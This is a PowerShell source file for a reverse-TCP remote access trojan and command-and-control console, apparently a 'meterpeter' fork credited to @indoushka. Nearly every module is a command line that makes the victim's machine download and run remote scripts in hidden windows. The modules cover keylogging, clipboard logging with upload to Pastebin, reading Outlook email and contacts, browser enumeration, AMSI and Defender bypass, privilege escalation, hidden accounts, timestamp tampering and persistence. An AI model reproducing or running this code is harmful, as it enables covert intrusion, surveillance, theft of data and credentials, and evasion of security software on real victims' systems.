##
#   Author: @indoushka
#   Tested Under: Windows 10 / 2016 x64 
...
$HTTP_PORT = "2121"                 # Python http.server LPort (optional)
...
$EndBanner = @"
   ...
   _
  |_|                                   
  ___  __     _  ______  ___  ___ __     __   ______ 
 | _ | |  \  || |  __  | | |  | | | |   | |  | ____ |      __________
 || || ||\ \ || | |  | | | |  | | | |   | | | |____| |  ___|_____   /
 || || || \ \|| | |  | | | |  | | | |   | | | _____  | |_. ___ \/  /  
 ||_|| ||  \  | | |__| | | |__| |  | |_| |  | |    | |  _| |__| | /
 |___| ||   \_| |_____ | |______|   |__ |   |_|    |_| |_______/ /____
Author: @ZHacker13 &('indoushka') - 2023 V${CmdLetVersion}  /_______/
...
$StartBanner = @"
 ...
 ||_|| ||  \  | | |__| | | |__| |  | |_| |  | |    | |  _| |__| | /
 |___| ||   \_| |_____ | |______|   |__ |   |_|    |_| |_______/ /____
 inouva Gate Reverse TCP+RAT                                  /_______/
...
| # -------------------------------------------------------------------------------
[+]           Author: @ZHacker13 &('indoushka') ${CmdLetVersion}                           |
| # ------------------------- Greetings to :---------------------------------------
...
$Modules = @"
 ...
 Author: @ZHacker13 &('indoushka') - 2023 V${CmdLetVersion} 
...
write-host "* PacketStorm: https://packetstormsecurity.com/files/authors/7697 *`n`n" -ForegroundColor DarkYellow
write-host "* Github: https://github.com/indoushka/Inouva-Gate *`n`n" -ForegroundColor DarkYellow
...
$Obfuscation = $null
## User Input Land ..
Write-Host "Here Input your WAN Ip or Host: " -NoNewline;
$RHOST = Read-Host;
$Local_Host = $RHOST -replace " ","";
Write-Host "Here Input your Local Port: " -NoNewline;
$LPORT = Read-Host;
...
Clear-Host;
Write-Host $StartBanner
write-host "   * GitHub: https://github.com/indoushka/meterpeter *`n`n" -ForegroundColor DarkYellow
...
If($check -ieq $False)
{
  ...
  If($Python_version)
  {
    ...
    If($FlavorSellection -eq 2)
    {
       ...
       #iwr -Uri "https://raw.githubusercontent.com/indoushka/meterpeter/master/mimiRatz/theme/meterpeter.ico" -OutFile "meterpeter.ico"|Out-Null
    ...
    ElseIf($FlavorSellection -eq 3)
    {
       ...
       iwr -Uri "https://raw.githubusercontent.com/indoushka/meterpeter/master/PS2EXE/ps2exe.ps1" -OutFile "ps2exe.ps1"|Out-Null
       iwr -Uri "https://raw.githubusercontent.com/indoushka/meterpeter/master/PS2EXE/meterpeter.ico" -OutFile "meterpeter.ico"|Out-Null
    ...
    ElseIf($FlavorSellection -eq 4)
    {
       ...
       If(-not(Test-Path -Path "$IPATH\Download_Crandle.vbs" -EA SilentlyContinue))
       {
          ...
          iwr -uri "https://raw.githubusercontent.com/indoushka/redpill/main/utils/crandle_builder.ps1" -OutFile "crandle_builder.ps1"|Unblock-File
       }
    ...
    Else
    {
       ...
       ## (ZIP + add RHOST) to dropper.bat before send it to apache 2 webroot ..
  ...
  If(-not ($WaitData))
  {
    ...
    If($Command -ieq "Pranks")
    {
      ...
      If($choise -ieq "CriticalError")
      {
         ...
         $Command = "powershell cd `$Env:TMP;iwr -Uri 'https://raw.githubusercontent.com/indoushka/meterpeter/master/mimiRatz/C2Prank.ps1' -OutFile 'C2Prank.ps1'|Unblock-File;Start-Process -windowstyle hidden powershell -ArgumentList '-file C2Prank.ps1 -MaxInteractions $MaxInteractions -DelayTime $DelayTime -bsodwallpaper $bsodwallpaper'"
      }
      ...
      If($choise -ieq "GoogleX")
      {
        ...
        If($EasterEgg -ieq "rotate")
        {
           ...
           $Command = "cd `$Env:TMP;iwr -Uri `"https://raw.githubusercontent.com/indoushka/redpill/main/lib/Misc-CmdLets/Prank2.ps1`" -OutFile `"`$Env:TMP\Prank2.ps1`"|Unblock-File;Start-Process -WindowStyle Hidden powershell -ArgumentList `"powershell -File `$Env:TMP\Prank2.ps1 -StartDelay '3' -LoopRange $LoopRange -LoopDelay $LoopDelay`";echo `"   [i] Opened: '$cmdline'`" `> prank.txt;Get-content prank.txt;Remove-Item prank.txt -Force";
        }
    ...
    If($Command -ieq "NetScanner")
    {
      ...
      If($choise -ieq "TCPinfo" -or $choise -ieq "TCP")
      {
         ...
         If($ConManager_choise -ieq "Stats")
         {
            ...
            $Command = "iwr -Uri `"https://raw.githubusercontent.com/indoushka/redpill/main/bin/GetConnections.ps1`" -OutFile `"`$Env:TMP\GetConnections.ps1`"|Out-Null;powershell -W 1 -file `$Env:TMP\GetConnections.ps1 -Action Stats;Start-Sleep -Seconds 1;Remove-Item -Path `$Env:TMP\GetConnections.ps1 -Force"         
         }
         If($ConManager_choise -ieq "Query")
         {
            write-host " * Enumerating established TCP connections." -ForegroundColor Green
            $Command = "iwr -Uri `"https://raw.githubusercontent.com/indoushka/redpill/main/bin/GetConnections.ps1`" -OutFile `"`$Env:TMP\GetConnections.ps1`"|Out-Null;powershell -W 1 -file `$Env:TMP\GetConnections.ps1 -Action Enum;Start-Sleep -Seconds 1;Remove-Item -Path `$Env:TMP\GetConnections.ps1 -Force"
         }
         If($ConManager_choise -ieq "Verbose")
         {
            write-host " * Enumerating established TCP\UDP connections." -ForegroundColor Green
            $Command = "iwr -Uri `"https://raw.githubusercontent.com/indoushka/redpill/main/bin/GetConnections.ps1`" -OutFile `"`$Env:TMP\GetConnections.ps1`"|Out-Null;powershell -W 1 -file `$Env:TMP\GetConnections.ps1 -Action Verbose;Start-Sleep -Seconds 1;Remove-Item -Path `$Env:TMP\GetConnections.ps1 -Force"
         }
      ...
      If($choise -ieq "PingScan" -or $choise -ieq "Ping")
      {
         ...
         If($ping_choise -ieq "Enum")
         {
            ...
            $Command = "iwr -Uri `"https://raw.githubusercontent.com/indoushka/redpill/main/bin/PingSweep.ps1`" -OutFile `"`$Env:TMP\PingSweep.ps1`"|Out-Null;powershell -File `$Env:TMP\PingSweep.ps1 -Action Enum -IpRange `"$IpRange`" -TimeOut `"$TimeOut`" -Egg True;Remove-Item -Path `$Env:TMP\PingSweep.ps1 -Force"
         }
         If($ping_choise -ieq "PortScan")
         {
            ...
            $Command = "iwr -Uri `"https://raw.githubusercontent.com/indoushka/redpill/main/bin/PingSweep.ps1`" -OutFile `"`$Env:TMP\PingSweep.ps1`"|Out-Null;powershell -File `$Env:TMP\PingSweep.ps1 -Action PortScan -IpRange `"$IpRange`" -ScanType $ScanType -TimeOut `"$TimeOut`" -Egg True;Remove-Item -Path `$Env:TMP\PingSweep.ps1 -Force"
         }
         If($ping_choise -ieq "AddrScan")
         {
            ...
            $Command = "iwr -Uri `"https://raw.githubusercontent.com/indoushka/redpill/main/bin/PingSweep.ps1`" -OutFile `"`$Env:TMP\PingSweep.ps1`"|Out-Null;powershell -File `$Env:TMP\PingSweep.ps1 -Action PortScan -IpRange `"$IpRange`" -ScanType $ScanType -OutPut $Outputs -Egg True;Remove-Item -Path `$Env:TMP\PingSweep.ps1 -Force"
         }
      ...
      If($choise -ieq "GeoLocate" -or $choise -ieq "GEO")
      {
         ...
         If($Geo_choise -ieq "GeoLocate")
         {
            ...
            If($PublicIpSettings -iMatch '^(y|yes)$')
            {
               ...
               $Command = "iwr -Uri `"https://raw.githubusercontent.com/indoushka/redpill/main/bin/GeoLocation.ps1`" -OutFile `"`$Env:TMP\GeoLocation.ps1`"|Out-Null;powershell -File `$Env:TMP\GeoLocation.ps1 -HiddeMyAss false;Remove-Item -Path `$Env:TMP\GeoLocation.ps1 -Force"
            }
            Else
            {
               #Execute command remotely
               Write-Host " * Scanning remote host geo location!" -ForegroundColor Green
               $Command = "iwr -Uri `"https://raw.githubusercontent.com/indoushka/redpill/main/bin/GeoLocation.ps1`" -OutFile `"`$Env:TMP\GeoLocation.ps1`"|Out-Null;powershell -File `$Env:TMP\GeoLocation.ps1 -HiddeMyAss true;Remove-Item -Path `$Env:TMP\GeoLocation.ps1 -Force"
            }
         }
         If($Geo_choise -ieq "ifconfig")
         {
            ...
            If($PublicIpSettings -iMatch '^(y|yes)$')
            {
               #Execute command remotely
               Write-Host " * Scanning remote host geo location!" -ForegroundColor Green
               $Command = "iwr -Uri `"https://raw.githubusercontent.com/indoushka/redpill/main/lib/Exfiltration/Get-ComputerGeoLocation.ps1`" -OutFile `"`$Env:TMP\Get-ComputerGeoLocation.ps1`";powershell -File `$Env:TMP\Get-ComputerGeoLocation.ps1 -Api 'ifconfig' -Detail $Verboseme -PublicAddr false;Remove-Item -Path `$Env:TMP\Get-ComputerGeoLocation.ps1 -Force"
            }
            Else
            {
               #Execute command remotely
               Write-Host " * Scanning remote host geo location!" -ForegroundColor Green
               $Command = "iwr -Uri `"https://raw.githubusercontent.com/indoushka/redpill/main/lib/Exfiltration/Get-ComputerGeoLocation.ps1`" -OutFile `"`$Env:TMP\Get-ComputerGeoLocation.ps1`";powershell -File `$Env:TMP\Get-ComputerGeoLocation.ps1 -Api 'ifconfig' -Detail $Verboseme -PublicAddr true;Remove-Item -Path `$Env:TMP\Get-ComputerGeoLocation.ps1 -Force"
            }
         }
    ...
    If($Command -ieq "AdvInfo" -or $Command -ieq "adv")
    {
      ...
      If($choise -ieq "Processes" -or $choise -ieq "proc")
      {
         ...
         If($wifi_choise -ieq "Query")
         {
            ...
            Else
            {
               $Command = "iwr -uri `"https://raw.githubusercontent.com/indoushka/redpill/main/bin/GetProcess.ps1`" -OutFile `"`$Env:TMP\GetProcess.ps1`"|Unblock-File;powershell -File `"`$Env:TMP\GetProcess.ps1`" -GetProcess Enum -ProcessName `"$Proc_name`" -verb true -exclude 'false';Remove-Item -Path `$Env:TMP\GetProcess.ps1 -Force";
            }
         }
         If($wifi_choise -ieq "DllSearch")
         {
               write-host ""
               $Command = "iwr -uri `"https://raw.githubusercontent.com/indoushka/redpill/main/bin/DLLSearch.ps1`" -OutFile `"`$Env:TMP\DLLSearch.ps1`"|Unblock-File;powershell -File `"`$Env:TMP\DLLSearch.ps1`" -filter 'all';Remove-Item -Path `$Env:TMP\DLLSearch.ps1 -Force";         
         }
         ...
         If($wifi_choise -ieq "kill")
         {
            ...
            If(-not($KillChoise) -or $KillChoise -iMatch '(n|ProcessName)')
            {
               ...
               Else
               {
                  ...
                  $Command = "iwr -Uri `"https://raw.githubusercontent.com/indoushka/redpill/main/bin/killProcess.ps1`" -OutFile `"`$Env:TMP\killProcess.ps1`"|Unblock-File;powershell -file `"`$Env:TMP\killProcess.ps1`" -Proc_name $Proc_name -ppid false -dontkill `"$DontKill`";Remove-Item -Path `"`$Env:TMP\killProcess.ps1`" -Force"
               }
            }
            Else
            {
               ...
               Else
               {
                  ...
                  $Command = "iwr -Uri `"https://raw.githubusercontent.com/indoushka/redpill/main/bin/killProcess.ps1`" -OutFile `"`$Env:TMP\killProcess.ps1`"|Unblock-File;powershell -file `"`$Env:TMP\killProcess.ps1`" -Proc_name false -ppid $Proc_name;Remove-Item -Path `"`$Env:TMP\killProcess.ps1`" -Force"        
               }
            }
         }
      ...
      If($choise -ieq "tasks")
      {
         ...
         {
            write-host ""
            $Command = "iwr -uri `"https://raw.githubusercontent.com/indoushka/redpill/main/bin/SchTasks.ps1`" -OutFile `"`$Env:TMP\SchTasks.ps1`"|Unblock-File;Powershell -file `"`$Env:TMP\SchTasks.ps1`" -action `"check`";Remove-Item -Path `"`$Env:TMP\SchTasks.ps1`" -Force"
         }
         If($my_choise -ieq "Query")
         {
            ...
            write-host "`n"
            $Command = "iwr -uri `"https://raw.githubusercontent.com/indoushka/redpill/main/bin/SchTasks.ps1`" -OutFile `"`$Env:TMP\SchTasks.ps1`"|Unblock-File;Powershell -file `"`$Env:TMP\SchTasks.ps1`" -action `"query`" -taskname `"$TaskName`";Remove-Item -Path `"`$Env:TMP\SchTasks.ps1`" -Force"
         }
         If($my_choise -ieq "RunOnce")
         {
            ...
            write-host ""
            $Command = "iwr -uri `"https://raw.githubusercontent.com/indoushka/redpill/main/bin/SchTasks.ps1`" -OutFile `"`$Env:TMP\SchTasks.ps1`"|Unblock-File;Powershell -file `"`$Env:TMP\SchTasks.ps1`" -action `"RunOnce`" -TaskName `"$TaskName`" -StartTime `"$StartTime`" -Execute `"$Execute`";Remove-Item -Path `"`$Env:TMP\SchTasks.ps1`" -Force"
         }
         If($my_choise -ieq "LoopExec")
         {
            ...
            write-host "`n"
            $Command = "iwr -uri `"https://raw.githubusercontent.com/indoushka/redpill/main/bin/SchTasks.ps1`" -OutFile `"`$Env:TMP\SchTasks.ps1`"|Unblock-File;Powershell -file `"`$Env:TMP\SchTasks.ps1`" -action `"LoopExec`" -TaskName `"$TaskName`" -Interval `"$Interval`" -Duration `"$Duration`" -Execute `"$Execute`";Remove-Item -Path `"`$Env:TMP\SchTasks.ps1`" -Force"
         }
         If($my_choise -ieq "Delete")
         {
           ...
           write-host "`n"
           $Command = "iwr -uri `"https://raw.githubusercontent.com/indoushka/redpill/main/bin/SchTasks.ps1`" -OutFile `"`$Env:TMP\SchTasks.ps1`"|Unblock-File;Powershell -file `"`$Env:TMP\SchTasks.ps1`" -action `"Delete`" -TaskName `"$TaskName`";Remove-Item -Path `"`$Env:TMP\SchTasks.ps1`" -Force"
         }
      ...
      If($choise -ieq "Browser")
      {
         ...
         If($Enumerate_choise -ieq "Start")
         {
           ...
           $Command = "iwr -Uri `"https://raw.githubusercontent.com/indoushka/meterpeter/master/mimiRatz/GetBrowsers.ps1`" -OutFile `"`$Env:TMP\GetBrowsers.ps1`"|Out-Null;powershell -WindowStyle hidden -File `$Env:TMP\GetBrowsers.ps1 -RECON;Remove-Item -Path `$Env:TMP\BrowserEnum.log -Force;Remove-Item -Path `$Env:TMP\GetBrowsers.ps1 -Force"
         }
         If($Enumerate_choise -ieq "addons")
         {
           write-host " * Installed browsers addons query." -ForegroundColor Green
           $Command = "iwr -Uri `"https://raw.githubusercontent.com/indoushka/meterpeter/master/mimiRatz/GetBrowsers.ps1`" -OutFile `"`$Env:TMP\GetBrowsers.ps1`"|Out-Null;powershell -WindowStyle hidden -File `$Env:TMP\GetBrowsers.ps1 -ADDONS;Remove-Item -Path `$Env:TMP\BrowserEnum.log -Force;Remove-Item -Path `$Env:TMP\GetBrowsers.ps1 -Force"
         }
         If($Enumerate_choise -ieq "Verbose")
         {
           ...
           $Command = "iwr -Uri `"https://raw.githubusercontent.com/indoushka/meterpeter/master/mimiRatz/GetBrowsers.ps1`" -OutFile `"`$Env:TMP\GetBrowsers.ps1`"|Out-Null;powershell -WindowStyle hidden -File `$Env:TMP\GetBrowsers.ps1 -ALL;Remove-Item -Path `$Env:TMP\BrowserEnum.log -Force;Remove-Item -Path `$Env:TMP\GetBrowsers.ps1 -Force"
         }
      ...
      If($choise -ieq "AntiVirus" -or $choise -ieq "avp")
      {
         ...
         If($my_choise -ieq "Primary")
         {
            ...
            $Command = "iwr -uri `"https://raw.githubusercontent.com/indoushka/redpill/main/bin/GetCounterMeasures.ps1`" -outfile `"`$Env:TMP\GetCounterMeasures.ps1`"|Unblock-File;powershell -File `$Env:TMP\GetCounterMeasures.ps1 -Action Enum;Remove-Item -Path `$Env:TMP\GetCounterMeasures.ps1 -Force";
         }
         If($my_choise -ieq "FastScan")
         {
            ...
            $Command = "iwr -uri `"https://raw.githubusercontent.com/indoushka/redpill/main/bin/GetCounterMeasures.ps1`" -outfile `"`$Env:TMP\GetCounterMeasures.ps1`"|Unblock-File;powershell -File `$Env:TMP\GetCounterMeasures.ps1 -Action 'enum' -stringsearch 'true' -string `"$StringToSearch`";Remove-Item -Path `$Env:TMP\GetCounterMeasures.ps1 -Force";
         }
         If($my_choise -ieq "Verbose")
         {
            ...
            $StringToSearch = "Defender|antimalware|sandboxing|Symantec|AVG|Avast|BitDefender|Comodo|Cisco|ESET|FireEye|F-Secure|Kaspersky|Malwarebytes|McAfee|Panda|Sophos|SentinelOne"
            $Command = "iwr -uri `"https://raw.githubusercontent.com/indoushka/redpill/main/bin/GetCounterMeasures.ps1`" -outfile `"`$Env:TMP\GetCounterMeasures.ps1`"|Unblock-File;powershell -File `$Env:TMP\GetCounterMeasures.ps1 -Action Verbose -stringsearch 'true' -string `"$StringToSearch`";Remove-Item -Path `$Env:TMP\GetCounterMeasures.ps1 -Force";
         }
         If($my_choise -ieq "Return" -or $my_choise -ieq "cls" -or $my_choise -ieq "Modules" -or $my_choise -ieq "clear")
         {
           $Command = $Null;
      ...
      If($choise -ieq "OutLook")
      {
         ...
         If($OutLook_choise -ieq "Folders")
         {
            ...
            $Command = "If((Get-MpComputerStatus).RealTimeProtectionEnabled -ieq `"True`"){iwr -Uri `"https://raw.githubusercontent.com/indoushka/redpill/main/bin/ReadEmails.ps1`" -OutFile `"`$Env:TMP\ReadEmails.ps1`"|Out-Null;powershell -File `$Env:TMP\ReadEmails.ps1 -action 'folders' -Egg `"True`";Remove-Item -Path `$Env:TMP\ReadEmails.ps1 -Force}Else{echo '';echo `"   Error: Outlook does not let us manipulate it if RealTimeProtection its disabled ..`" `> `$Env:TMP\fsddsvd.log;Get-Content -Path `"`$Env:TMP\fsddsvd.log`";Remove-Item -Path `"`$Env:TMP\fsddsvd.log`" -Force}";
         }
         If($OutLook_choise -ieq "Contacts")
         {
            ...
            $Command = "If((Get-MpComputerStatus).RealTimeProtectionEnabled -ieq `"True`"){iwr -Uri `"https://raw.githubusercontent.com/indoushka/redpill/main/bin/ReadEmails.ps1`" -OutFile `"`$Env:TMP\ReadEmails.ps1`"|Out-Null;powershell -File `$Env:TMP\ReadEmails.ps1 -action 'contacts' -maxitems '$MaxOfObjectsToDisplay' -logfile `"$CreateLogFileSetting`" -Egg `"True`";Remove-Item -Path `$Env:TMP\ReadEmails.ps1 -Force}Else{echo '';echo `"   Error: Outlook does not let us manipulate it if RealTimeProtection its disabled ..`" `> `$Env:TMP\fsddsvd.log;Get-Content -Path `"`$Env:TMP\fsddsvd.log`";Remove-Item -Path `"`$Env:TMP\fsddsvd.log`" -Force}"
         }
         If($OutLook_choise -ieq "Emails")
         {
            ...
            $Command = "If((Get-MpComputerStatus).RealTimeProtectionEnabled -ieq `"True`"){iwr -Uri `"https://raw.githubusercontent.com/indoushka/redpill/main/bin/ReadEmails.ps1`" -OutFile `"`$Env:TMP\ReadEmails.ps1`"|Out-Null;powershell -File `$Env:TMP\ReadEmails.ps1 -action 'enum' -MaxItems `"$MaxOfObjectsToDisplay`" -logfile `"$CreateLogFileSetting`" -verb `"$UseVerbose`" -Egg `"True`";Remove-Item -Path `$Env:TMP\ReadEmails.ps1 -Force}Else{echo '';echo `"   Error: Outlook does not let us manipulate it if RealTimeProtection its disabled ..`" `> `$Env:TMP\fsddsvd.log;Get-Content -Path `"`$Env:TMP\fsddsvd.log`";Remove-Item -Path `"`$Env:TMP\fsddsvd.log`" -Force}"
         }
         If($OutLook_choise -ieq "Filter" -or $OutLook_choise -ieq "SenderName")
         {
            ...
            Else
            {
               ...
               $Command = "If((Get-MpComputerStatus).RealTimeProtectionEnabled -ieq `"True`"){iwr -Uri `"https://raw.githubusercontent.com/indoushka/redpill/main/bin/ReadEmails.ps1`" -OutFile `"`$Env:TMP\ReadEmails.ps1`"|Out-Null;powershell -File `$Env:TMP\ReadEmails.ps1 -action 'enum' -MaxItems `"$MaxOfObjectsToDisplay`" -logfile `"$CreateLogFileSetting`" -Filter `"$SenderNameSearch`" -verb `"$UseVerbose`" -Egg `"True`";Remove-Item -Path `$Env:TMP\ReadEmails.ps1 -Force}Else{echo '';echo `"   Error: Outlook does not let us manipulate it if RealTimeProtection its disabled ..`" `> `$Env:TMP\fsddsvd.log;Get-Content -Path `"`$Env:TMP\fsddsvd.log`";Remove-Item -Path `"`$Env:TMP\fsddsvd.log`" -Force}"
            }
         }
      ...
      If($choise -ieq "FRM" -or $choise -ieq "FRManager")
      {
         ...
         If($Firewall_choise -ieq "Query")
         {
            ...
            $Command = "iwr -Uri `"https://raw.githubusercontent.com/indoushka/redpill/main/bypass/SilenceDefender_ATP.ps1`" -OutFile `"`$Env:TMP\SilenceDefender_ATP.ps1`"|Unblock-File;powershell -File `$Env:TMP\SilenceDefender_ATP.ps1 -Action Query;Remove-Item -Path `"`$Env:TMP\SilenceDefender_ATP.ps1`" -Force"
         }
         ...
         If($Firewall_choise -ieq "Delete")
         {
            ...
            Else
            {
               $Command = "iwr -Uri `"https://raw.githubusercontent.com/indoushka/redpill/main/bypass/SilenceDefender_ATP.ps1`" -OutFile `"`$Env:TMP\SilenceDefender_ATP.ps1`"|Unblock-File;powershell -File `$Env:TMP\SilenceDefender_ATP.ps1 -Action Delete -DisplayName `"$DisplayName`";Remove-Item -Path `"`$Env:TMP\SilenceDefender_ATP.ps1`" -Force"         
            }
         }
    ...
    If($Command -ieq "keylogger")
    {
        ...
        If($choise -ieq "clip" -or $choise -ieq "clipboard")
        {
           ...
           Else
           {
              ...
              {
                 $Command = "iwr -uri `"https://raw.githubusercontent.com/indoushka/meterpeter/master/mimiRatz/ClipLogger.ps1`" -OutFile `"`$Env:TMP\ClipLogger.ps1`"|Unblock-File;Start-Process -WindowStyle hidden powershell -ArgumentList `"-file `$Env:TMP\ClipLogger.ps1 -dontfilter`";echo `"   Clipboard keylogger started at: $StarTimer...`";echo `"   Logfile: $Env:TMP\ClipBoardLogger.log`""
              }
              Else
              {
                 $Command = "iwr -uri `"https://raw.githubusercontent.com/indoushka/meterpeter/master/mimiRatz/ClipLogger.ps1`" -OutFile `"`$Env:TMP\ClipLogger.ps1`"|Unblock-File;Start-Process -WindowStyle hidden powershell -ArgumentList `"-file `$Env:TMP\ClipLogger.ps1`";echo `"   Clipboard keylogger started at: $StarTimer...`";echo `"   Logfile: $Env:TMP\ClipBoardLogger.log`""
              }
           }
        }
        If($choise -ieq "Mouse")
        ...
        If($choise -ieq "Start")
        {
           ...
           $Command = "iwr -uri `"https://raw.githubusercontent.com/indoushka/meterpeter/master/mimiRatz/keymanager.ps1`" -OutFile `"`$Env:TMP\KeyManager.ps1`"|Unblock-File;powershell -File `"`$Env:TMP\KeyManager.ps1`" -Action 'Start' -UsePS2 $UsePS2;Remove-Item -Path `"`$Env:TMP\KeyManager.ps1`" -Force"
        }
        If($choise -ieq "Stop")
        {
           ## Stop recording system keystrokes
           $Command = "iwr -uri `"https://raw.githubusercontent.com/indoushka/meterpeter/master/mimiRatz/keymanager.ps1`" -OutFile `"`$Env:TMP\KeyManager.ps1`"|Unblock-File;powershell -File `"`$Env:TMP\KeyManager.ps1`" -Action 'Stop';Remove-Item -Path `"`$Env:TMP\KeyManager.ps1`" -Force"
        }
        If($choise -ieq "PasteBin")
        {
           ...
           If($PasteBinChoise -ieq "Start")
           {
              ...
              {
                 $Command = "iwr -uri `"https://raw.githubusercontent.com/indoushka/meterpeter/master/mimiRatz/SendToPasteBin.ps1`" -OutFile `"`$Env:TMP\SendToPasteBin.ps1`"|Unblock-file;Start-Process -WindowStyle hidden powershell -ArgumentList `"-File `$Env:TMP\SendToPasteBin.ps1 -PastebinUsername $PastebinUsername -PastebinPassword $PastebinPassword -MaxPastes $MaxPastes -TimeOut $TimeOut -Egg true`"";
              }
              Else
              {
                 $Command = $Null;
    ...
    If($Command -ieq "PostExploit" -or $Command -ieq "post")
    {
      ...
      If($choise -ieq "Allprivs")
      {
        ...
        If($all_choise -ieq "demo")
        {
           ...
           $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){iwr -uri `"https://raw.githubusercontent.com/indoushka/redpill/main/utils/EnableAllParentPrivileges.exe`" -OutFile `"`$Env:TMP\EnableAllParentPrivileges.exe`"|Unblock-File;cd `$Env:TMP;.\EnableAllParentPrivileges.exe;$CmdlineToExecute;Remove-Item -Path `"`$Env:TMP\EnableAllParentPrivileges.exe`" -Force;Get-Content myprivileges.log;Remove-Item myprivileges.log -Force}Else{echo `"   Error: administrator privileges required on remote`" `> `$Env:TMP\fddds.log;Get-Content -Path `"`$Env:TMP\fddds.log`";Remove-Item -Path `"`$Env:TMP\fddds.log`" -Force}"
        }
        If($all_choise -ieq "cmdline")
        {
           ...
           $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){iwr -uri `"https://raw.githubusercontent.com/indoushka/redpill/main/utils/EnableAllParentPrivileges.exe`" -OutFile `"`$Env:TMP\EnableAllParentPrivileges.exe`"|Unblock-File;cd `$Env:TMP;.\EnableAllParentPrivileges.exe;$CmdlineToExecute;Remove-Item -Path `"`$Env:TMP\EnableAllParentPrivileges.exe`" -Force}Else{echo `"   Error: administrator privileges required on remote`" `> `$Env:TMP\fddds.log;Get-Content -Path `"`$Env:TMP\fddds.log`";Remove-Item -Path `"`$Env:TMP\fddds.log`" -Force}"
        }
      ...
      If($choise -ieq "AMSIpatch")
      {
        ...
        If($Patch_choise -ieq "Console")
        {
           ...
           $Technic = Read-Host;
           $Command = "iwr -uri `"https://raw.githubusercontent.com/indoushka/redpill/main/bypass/Invoke-Bypass.ps1`" -OutFile `"`$Env:TMP\Invoke-Bypass.ps1`"|Unblock-File;powershell -file `$Env:TMP\Invoke-Bypass.ps1 -technic `"$Technic`";Remove-Item -Path `"`$Env:TMP\Invoke-Bypass.ps1`" -Force"
        }
        If($Patch_choise -ieq "FilePath")
        {
           ...
           If($MArs -iMatch '^(y|yes)$')
           {
              ...
              $FileArgs = Read-Host;
              $Command = "iwr -uri `"https://raw.githubusercontent.com/indoushka/redpill/main/bypass/Invoke-Bypass.ps1`" -OutFile `"`$Env:TMP\Invoke-Bypass.ps1`"|Unblock-File;powershell -file `$Env:TMP\Invoke-Bypass.ps1 -technic `"$Technic`" -filepath `"$FilePath`" -fileargs `"$FileArgs`";Remove-Item -Path `"`$Env:TMP\Invoke-Bypass.ps1`" -Force";
           }
           Else
           {
              $Command = "iwr -uri `"https://raw.githubusercontent.com/indoushka/redpill/main/bypass/Invoke-Bypass.ps1`" -OutFile `"`$Env:TMP\Invoke-Bypass.ps1`"|Unblock-File;powershell -file `$Env:TMP\Invoke-Bypass.ps1 -technic `"$Technic`" -filepath `"$FilePath`";Remove-Item -Path `"`$Env:TMP\Invoke-Bypass.ps1`" -Force"           
           }
        }
        If($Patch_choise -ieq "PayloadUrl")
        {
           ...
           If($MArs -iMatch '^(y|yes)$')
           {
              write-host " - Input script arguments       : " -NoNewline;
              $FileArgs = Read-Host;
              $Command = "iwr -uri `"https://raw.githubusercontent.com/indoushka/redpill/main/bypass/Invoke-Bypass.ps1`" -OutFile `"`$Env:TMP\Invoke-Bypass.ps1`"|Unblock-File;powershell -file `$Env:TMP\Invoke-Bypass.ps1 -technic `"$Technic`" -Payloadurl `"$PayloadUrl`" -fileargs `"$FileArgs`";Remove-Item -Path `"`$Env:TMP\Invoke-Bypass.ps1`" -Force";
           }
           Else
           {
              $Command = "iwr -uri `"https://raw.githubusercontent.com/indoushka/redpill/main/bypass/Invoke-Bypass.ps1`" -OutFile `"`$Env:TMP\Invoke-Bypass.ps1`"|Unblock-File;powershell -file `$Env:TMP\Invoke-Bypass.ps1 -technic `"$Technic`" -payloadurl `"$PayloadUrl`";Remove-Item -Path `"`$Env:TMP\Invoke-Bypass.ps1`" -Force";
           }
        }
      ...
      If($choise -ieq "FindEop" -or $choise -ieq "EOP")
      {
        ...
        If($my_choise -ieq "Agressive")
        {
           ...
           If($VerOut -iMatch '^(y|yes)$')
           {
              ...
              $Command = "iwr -Uri https://raw.githubusercontent.com/indoushka/meterpeter/master/mimiRatz/FindEop.ps1 -OutFile FindEOP.ps1;powershell -file FindEOP.ps1 -verb true;Remove-Item -Path FindEOP.ps1 -Force"
           }
           Else
           {
              Write-Host "   => Remark: Module takes aprox 3 minuts to finish .." -ForegroundColor Yellow;write-host "`n";
              $Command = "iwr -Uri https://raw.githubusercontent.com/indoushka/meterpeter/master/mimiRatz/FindEop.ps1 -OutFile `$Env:TMP\FindEOP.ps1;powershell -File `$Env:TMP\FindEOP.ps1;Remove-Item -Path `"`$Env:TMP\FindEOP.ps1`" -Force"
           }
        }
      ...
      If($choise -ieq "HideUser")
      {
         ...
         If($AccManager_choise -ieq "Query")
         {
            ...
            $Command = "iwr -Uri `"https://raw.githubusercontent.com/indoushka/redpill/main/bin/HiddenUser.ps1`" -OutFile `"`$Env:TMP\HiddenUser.ps1`"|Out-Null;powershell -WindowStyle hidden -File `$Env:TMP\HiddenUser.ps1 -Action Query;Remove-Item -Path `$Env:TMP\HiddenUser.ps1 -Force"
         }
      ...
      If($choise -ieq "TimeStamp" -or $choise -ieq "mace")
      {
         ...
         If($timestamp_choise -ieq "Modify")
         {
            ...
            $Command = "iwr -Uri `"https://raw.githubusercontent.com/indoushka/redpill/main/bin/FileMace.ps1`" -OutFile `"`$Env:TMP\FileMace.ps1`"|Out-NUll;powershell -WindowStyle hidden -file `$Env:TMP\FileMace.ps1 -FileMace `"$FileMace`" -Date `"$DateMace`";Start-Sleep -Seconds 4;Remove-Item -Path `"`$Env:TMP\FileMace.ps1`" -Force"
         }
...
"@;Write-Host $AnwsomeBanner
          ...
          Write-Host "  => _EOP_ shell settings: RHOST:" -ForegroundColor Red -BackgroundColor Black -NoNewline;
      ...
      If($choise -ieq "Persist" -or $choise -ieq "persistance")
      {
        ...
        write-host "   Meterpeter C2 must be put in listener mode (using same RHOST|lport), and";
        ...
        If($startup_choise -ieq "ADSRUN" -or $startup_choise -ieq "ADS")
        {
           ...
           If($Chosen_Option -iMatch '^(create)$')
           {
              ...
              If($Client_name -iMatch '\\' -and $Image_name -iMatch '\\')
              {
                 ...
